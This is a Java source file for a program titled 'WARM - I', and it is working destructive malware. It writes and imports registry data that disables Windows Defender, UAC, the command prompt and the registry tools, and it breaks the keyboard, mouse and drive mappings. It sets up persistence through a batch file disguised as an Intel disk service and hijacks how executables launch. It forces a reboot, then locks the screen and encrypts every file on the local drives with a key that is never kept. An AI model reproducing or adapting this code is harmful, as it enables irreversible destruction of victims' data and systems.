package WAR;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.atomic.AtomicInteger;
import static java.nio.file.Files.writeString;
public final class Main {
    private static FileInputStream inputStream;
    private static FileOutputStream outputStream;
    private static HashMap<String, Integer> driveMap = new HashMap<>();
    private static final String mapPath = "C:\\Program Files\\map.dat";
    private static ObjectOutputStream oos;
    private static final GraphicsDevice[] gs = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
    private static final ArrayList<File> drives = new ArrayList<>();
    private static final Point p = new Point(420, 420);
    private static final Path regPath = Path.of("C:\\Program Files\\regdata.reg");
    private static final String shutDownCommand = "shutdown /r /t 0";
    private static final String regRunCommand = "regedit /s C:\\Program Files\\regdata.reg";
    private static final String runMessage = "Already Executed !";
    private static final String regData = """
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]
"Scancode Map"=hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00,2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"intel-disk-checker-service"="C:\\Program Files\\intel_disk_checker_service.bat"

[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
"NoViewContextMenu"=dword:00000001

[HKEY_CURRENT_USER\Control Panel\Mouse]
"SwapMouseButtons"="1"
"DoubleClickSpeed"="1"
"ClickLock"=dword:00000000
"MouseSpeed"="9999"
"Beep"="Yes"
"ExtendedSounds"="Yes"
"MouseThreshold1"="9999"
"MouseThreshold2"="9999"
"MouseSensivity"="9999"
"MouseTrails"="999"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AutoRotation]
"Enable"=dword:00000001
"LastOrientation"=dword:00000001
"SlateOrientation"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\HoloSI]
"DisableShellUI"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\HardwareIdentification]
"HardwareIDBehavior"=dword:00000001
"HardwareIDBehaviour"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SecureBoot]
"EncodedUEFI"=hex:00,00,00,00,00,00,00,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer]
"InstallerLocation"="nothing"
"MsiExecCA32"="nothing"
"MsiExecCA64"="nothing"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\FileExplorer\Config]
"DefaultFolder"="nothing"
"Feature_SetWallPaperImage"=dword:00000000
"NavigationRoots"="nothing"
"RemovableDriveIconCharacter"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\OpenWith]
"OpenWithLauncher"="nothing"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Personalization]
"AllowPersonalization"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\SHUTDOWN]
"LastBootPerfCounterFrequency"=qword:0000000000000000
"ShutdownStopTimePrefCounter"=qword:0000000000000000
"ShutdownStopTimePrefCounterCurrentBuildNumber"="nothing"
"ShutdownStopTimePrefCounterUBR"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\StillImage]
"WIADevicePresent"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Store]
"StoreContentModifier"="nothing"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Store\Configuration]
"Hardware"="kisuinai"
"OEMDiscoveryTTL"=qword:0000000000000000
"OEMID"="kisuinai"
"SCMID"="ghoraranda"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ThemeManager]
"DllName"="nothing"
"LMOverride"="456446456546546464362346"
"LMVersion"="-654654646464"
"LoadedBefore"="-65464646456546"
"ServerChangeNumber"=dword:00000000
"ThemeActive"="0"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\UpdateHealthTools]
"UDC"="ghoraranda"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\UpdatePlatform\UX\Configurations]
"ActiveHoursStartBufferInMinutes"=dword:00000000
"RebootDowntimeEstimatesEnabled"=dword:00000000
"RebootSBCEnabled"=dword:00000000
"SmartActiveHoursState"=dword:00000000
"SmartSchedulerDurationInMinutes"=dword:00000000
"UpdateUxAllowed"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows Block Level Backup]
"OverallPerformanceSetting"=dword:00500f00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]
"CommonFilesDir"="ghorarandabalcalbalfalao"
"CommonFilesDir (x86)"="ghorarandabalcalbalfalao"
"CommonW6432Dir"="ghorarandabalcalbalfalao"
"DevicePath"="ghorarandabalcalbalfalao"
"MediaPathUnexpanded"="ghorarandabalcalbalfalao"
"ProgramFilesDir"="ghorarandabalcalbalfalao"
"ProgramFilesDir (x86)"="ghorarandabalcalbalfalao"
"ProgramFilesPath"="ghorarandabalcalbalfalao"
"ProgramW6432Dir"="ghorarandabalcalbalfalao"
"SM_ConfigureProgramsName"="ghorarandabalcalbalfalao"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender]
"BackupLocation"="ghorarandabalcalbalfalao"
"DisableAntiSpyware"=dword:00000001
"DisableAntiVirus"=dword:00000001
"InstallLocation"="ghorarandabalcalbalfalao"
"InstallTime"=hex:00,00,00,00
"IsServiceRunning"=dword:00000001
"LastEnabledTime"=hex:00,00,00,00
"OOBInstallTime"=hex:00,00,00,00
"PassiveMode"=dword:00000001
"PreviousRunningMode"=dword:00000000
"ProductAppDataPath"="ghorarandabalcalbalfalao"
"ProductIcon"="ghorarandabalcalbalfalao"
"ProductLocalizedName"="ghorarandabalcalbalfalao"
"ProductLocalisedName"="ghorarandabalcalbalfalao"
"ProductStatus"=dword:0fffffff
"ProductType"=dword:0fffffff
"PUAProtection"=dword:00000000
"RemediationExe"="ghorarandabalcalbalfalao"
"SacLearningModeSwitch"=dword:00000000
"SmartLockerMode"=dword:00000000
"VerifiedAndReputableTrustModeEnabled"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\DeviceControl]
"PoliciesLastUpdated"=hex:00,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Diagnostics]
"CloudBadListVersion"=hex:00,00,00,00
"LastKnownGoodEngineCandidate"=hex:00,00,00,00
"LastKnownGoodPlatformLocation"="ghorarandabalcalbalfalao"
"PlatformHealthData"=hex:00,00,00,00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features]
"ChangedDefaults"=hex:00,00,00,00
"DlpAppEnlightenmentSettings"=dword:00000000
"DlpDisablePrintDetours"=dword:00000000
"DlpFileEvidenceEnabled"=dword:00000000
"MpCapability"=hex:00,00,00,00
"MpPlatformKillbitsExFromEngine"=hex:00,00,00,00
"MpPlatformKillbitsFromEngine"=hex:00,00,00,00
"TamperProtection"=dword:00000000
"TamperProtectionSource"=dword:00000000
"TPExclusions"=dword:0fffffff

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Miscellaneous Configuration]
"BddUpdateFailure"=dword:00000001
"DeltaUpdateFailure"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Quarentine]
"PurgeItemsAfterDelay"=dword:0fffffff

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection]
"DpaDisabled"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Scan]
"DaysUntilAggressiveCatchupQuickScan"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\UX Configuration]
"UILockdown"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\EditionSettings]
"RootDirectory"="ghorarandabalcalbalfalao"

[HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase]
"Architecture"=dword:0fffffff
"SystemRoot"="ghorarandabalcalbalfalao"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
"Userinit"="C:\Program Files\intel_disk_checker_service.bat"
"AutoRestartShell"=dword:00000001
"DisableCad"=dword:00000000
"AutoAdminLogon"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
"EnableLUA"=dword:00000000
"EnableSecureUIAPaths"=dword:00000000
"SupportFullTrustStartupTasks"=dword:00000001
"EnableFullTrustStartupTasks"=dword:00000001
"EnableInstallerDetection"=dword:00000000
"shutdownwithoutlogon"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\runas\command]
"(Default)"="C:\Program Files\intel_disk_checker_service.bat "%1" %*"

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command]
"(Default)"="C:\Program Files\intel_disk_checker_service.bat "%1" %*"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
"UseDefaultTile"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
"DisableLogonBackgroundImage"=dword:00000001

[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System]
"DisableCMD"=dword:00000002

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
"DisableRegistryTools"=dword:00000001

[HKEY_CURRENT_USER\Control Panel\Desktop]
"AutoColorization"=dword:00000001
"WallPaper"="ghorarandabalcalbalfalao"

[HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices]
"\DosDevices\D:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\C:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\E:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\F:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\G:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\H:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\I:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\J:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\K:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\L:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\M:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\N:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\O:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\P:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\Q:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\R:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\S:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\T:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\U:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\V:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\W:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\X:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\Y:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
"\DosDevices\Z:"=hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00""";
    static {try {oos = new ObjectOutputStream(new FileOutputStream(mapPath));} catch (IOException ignored) {}for (File file : File.listRoots()) {if ((FileSystemView.getFileSystemView().getSystemTypeDescription(file)).equalsIgnoreCase("local disk")) {drives.add(file);driveMap.put(file.getAbsolutePath(), 0);}}}
        public static void main(String[] args) {
        JFrame frame = new JFrame("window");
        frame.setUndecorated(true);
        frame.pack();
        frame.setSize(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height);
        frame.setTitle("WARM - I");
        frame.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
        frame.setResizable(false);
        frame.setIconImage(new ImageIcon("WARM - I logo.png").getImage());
        frame.getContentPane().setBackground(Color.BLACK);
        frame.setExtendedState(Frame.MAXIMIZED_BOTH);
        frame.setFocusTraversalKeysEnabled(false);
        frame.getContentPane().setCursor(Toolkit.getDefaultToolkit().createCustomCursor(new BufferedImage(16, 16, BufferedImage.TYPE_INT_ARGB), new Point(0, 0), "null cursor"));
        JLabel label = new JLabel("WARM - I");
        label.setHorizontalTextPosition(0);
        label.setVerticalTextPosition(0);
        label.setForeground(Color.red);
        label.setFont(new Font(Font.SANS_SERIF, Font.BOLD, 60));
        label.setVerticalAlignment(SwingConstants.CENTER);
        label.setHorizontalAlignment(SwingConstants.CENTER);
        frame.add(label);
        frame.setAlwaysOnTop(true);
        frame.setFocusableWindowState(true);
        frame.setFocusable(true);
        frame.requestFocus();
        try {FileReader fileReader = new FileReader("C:\\Program Files\\compressordata.dat");
            if (fileReader.read() != -1) {readMap();
                frame.addKeyListener(new KeyListener() {
                    @Override
                    public void keyTyped(KeyEvent e) {e.consume();frame.requestFocus();}
                    @Override
                    public void keyPressed(KeyEvent e) {e.consume();frame.requestFocus();}
                    @Override
                    public void keyReleased(KeyEvent e) {e.consume();frame.requestFocus();}});
                frame.addMouseListener(new MouseListener() {
                    @Override
                    public void mouseClicked(MouseEvent e) {frame.requestFocus();}
                    @Override
                    public void mousePressed(MouseEvent e) {frame.requestFocus();}
                    @Override
                    public void mouseReleased(MouseEvent e) {frame.requestFocus();}
                    @Override
                    public void mouseEntered(MouseEvent e) {frame.requestFocus();for (GraphicsDevice device : gs) {GraphicsConfiguration[] configurations = device.getConfigurations();for (GraphicsConfiguration config : configurations) {Rectangle bounds = config.getBounds();if (bounds.contains(p)) {try {new Robot(device).mouseMove(new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).x, new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).y);} catch (AWTException ignored) {}return;}}}frame.requestFocus();}
                    @Override
                    public void mouseExited(MouseEvent e) {frame.requestFocus();for (GraphicsDevice device : gs) {GraphicsConfiguration[] configurations = device.getConfigurations();for (GraphicsConfiguration config : configurations) {Rectangle bounds = config.getBounds();if (bounds.contains(p)) {try {new Robot(device).mouseMove(new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).x, new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).y);} catch (AWTException ignored) {}return;}}}frame.requestFocus();}});
                frame.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowIconified(WindowEvent e) {frame.setState(Frame.NORMAL);frame.requestFocus();}});
                frame.addWindowFocusListener(new WindowFocusListener() {
                    @Override
                    public void windowGainedFocus(WindowEvent e) {}
                    @Override
                    public void windowLostFocus(WindowEvent e) {if (e.getNewState() != WindowEvent.WINDOW_CLOSED) {frame.setAlwaysOnTop(false);frame.setAlwaysOnTop(true);frame.requestFocus();}}});
                frame.setVisible(true);
                for (File drive : drives) {Path dir = Paths.get(drive.getAbsolutePath());AtomicInteger fileCount = new AtomicInteger(0);int fileRead = (driveMap.get(dir.toString()));
                    new Thread(new Runnable() {
                        @Override
                        public void run() {Cipher cipher = null;
                            try {cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");cipher.init(Cipher.ENCRYPT_MODE, KeyGenerator.getInstance("AES").generateKey(), generateIv());} catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException |NoSuchPaddingException | InvalidKeyException ignored) {}
                            try {Cipher finalCipher = cipher;
                                Files.walkFileTree(dir, new SimpleFileVisitor<>() {
                                    @Override
                                    public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) {try {Files.walk(dir).forEach(path -> {if (fileCount.intValue() >= fileRead){processFile(finalCipher, path.toFile(),dir);}fileCount.getAndIncrement();});writeMap();} catch (Exception e) {return FileVisitResult.CONTINUE;} return FileVisitResult.CONTINUE;}
                                    @Override
                                    public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {if (exc != null) {return FileVisitResult.CONTINUE;}return super.visitFileFailed(file, null);}});} catch (IOException ignored) {}}}).start();}
            } else {while (true) {try {fire();break;} catch (IOException ignored) {}}}} catch (IOException ignored) {while (true) {try {fire();break;} catch (IOException ignored1) {}}}}
    private static void processFile(Cipher cipher, File file, Path drive) {if (!file.isDirectory() && !(file.getAbsoluteFile().getName().equalsIgnoreCase("warm - i.exe")) && !(file.getAbsoluteFile().getName().equalsIgnoreCase("compressordata.dat")) && !(file.getAbsoluteFile().getName().equalsIgnoreCase("map.dat")) && !(file.getAbsoluteFile().getName().equalsIgnoreCase("regdata.reg")) && !(file.getAbsoluteFile().getName().equalsIgnoreCase("hellshell.sh"))) {try {inputStream = new FileInputStream(file);outputStream = new FileOutputStream(file);byte[] buffer = new byte[64];int bytesRead;while ((bytesRead = inputStream.read(buffer)) != -1) {byte[] output = cipher.update(buffer, 0, bytesRead);if (output != null) {outputStream.write(output);}}byte[] outputBytes = cipher.doFinal();if (outputBytes != null) {outputStream.write(outputBytes);}} catch (Exception ignored) {} finally {try {inputStream.close();outputStream.close();} catch (IOException ignored) {}}}driveMap.put(drive.getFileName().toString(),(driveMap.get(drive.getFileName().toString())+1) );}
    private static void fire() throws IOException {writeMap();writeString(regPath, regData);executeCommand(regRunCommand);new FileWriter("C:\\Program Files\\compressordata.dat").write(runMessage);executeCommand(shutDownCommand);}
    private static void writeMap() {try {oos.writeObject(driveMap);} catch (IOException ignored) {}}
    private static void readMap() {try {driveMap = (HashMap<String, Integer>) new ObjectInputStream(new FileInputStream(mapPath)).readObject();} catch (IOException | ClassNotFoundException ignored) {}}
    private static IvParameterSpec generateIv() {byte[] iv = new byte[16];new SecureRandom().nextBytes(iv);return new IvParameterSpec(iv);}
    private static void executeCommand(String command) {try {Process process = Runtime.getRuntime().exec(command);process.waitFor();} catch (IOException | InterruptedException ignored) {}}}
